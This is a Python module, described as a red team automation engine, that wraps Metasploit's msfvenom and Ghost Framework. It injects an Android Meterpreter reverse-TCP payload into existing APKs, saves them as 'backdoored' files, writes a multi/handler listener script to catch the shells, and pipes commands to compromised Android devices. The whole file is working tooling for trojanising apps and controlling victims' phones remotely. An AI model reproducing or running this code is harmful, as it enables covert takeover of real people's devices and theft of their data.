"""
Red team automation engine.
Wraps msfvenom (Metasploit) for APK payload injection and Ghost Framework for Android C2.
Both tools must be installed separately.
"""
import asyncio
import shutil
from pathlib import Path

from config import settings


def _find_bin(name: str) -> str:
    found = shutil.which(name)
    if found:
        return found
    raise FileNotFoundError(
        f"{name} not found on PATH. "
        "Install Metasploit (https://metasploit.com) and ensure msfvenom is on PATH."
        if name == "msfvenom"
        else f"Install Ghost Framework (https://github.com/EntySec/Ghost) and ensure {name} is on PATH."
    )


async def inject_payload(
    apk_path: Path,
    lhost: str,
    lport: int,
    payload: str = "android/meterpreter/reverse_tcp",
) -> Path:
    """
    Inject a Meterpreter payload into an existing APK using msfvenom.
    Returns the path to the backdoored APK.
    """
    msfvenom = _find_bin("msfvenom")
    out_path = settings.uploads_dir / f"{apk_path.stem}_backdoored.apk"

    cmd = [
        msfvenom,
        "-x", str(apk_path),
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", str(out_path),
    ]

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)

    if proc.returncode != 0:
        raise RuntimeError(
            f"msfvenom exited {proc.returncode}: {stderr.decode(errors='replace').strip()}"
        )

    if not out_path.exists():
        raise RuntimeError("msfvenom completed but output APK not found")

    return out_path


async def generate_listener_rc(lhost: str, lport: int, payload: str) -> str:
    """Generate a Metasploit resource script to start the multi/handler listener."""
    return (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"exploit -j\n"
    )


# ── Ghost Framework ────────────────────────────────────────────────────────────

class GhostSession:
    """Manages a Ghost Framework subprocess session."""

    def __init__(self, session_id: str, device_id: str):
        self.session_id = session_id
        self.device_id = device_id
        self._proc: asyncio.subprocess.Process | None = None
        self.output_lines: list[str] = []

    async def connect(self) -> None:
        ghost = _find_bin("ghost")
        self._proc = await asyncio.create_subprocess_exec(
            ghost, "connect", self.device_id,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        asyncio.create_task(self._read_output())

    async def _read_output(self) -> None:
        assert self._proc and self._proc.stdout
        async for line in self._proc.stdout:
            self.output_lines.append(line.decode(errors="replace").rstrip())
            if len(self.output_lines) > 500:
                self.output_lines = self.output_lines[-500:]

    async def run_command(self, cmd: str) -> None:
        if not self._proc or not self._proc.stdin:
            raise RuntimeError("Ghost session not connected")
        self._proc.stdin.write((cmd + "\n").encode())
        await self._proc.stdin.drain()

    async def close(self) -> None:
        if self._proc:
            try:
                self._proc.stdin.write(b"exit\n")
                await self._proc.stdin.drain()
            except Exception:
                pass
            try:
                self._proc.terminate()
            except Exception:
                pass


# In-memory ghost sessions keyed by session_id
_ghost_sessions: dict[str, GhostSession] = {}
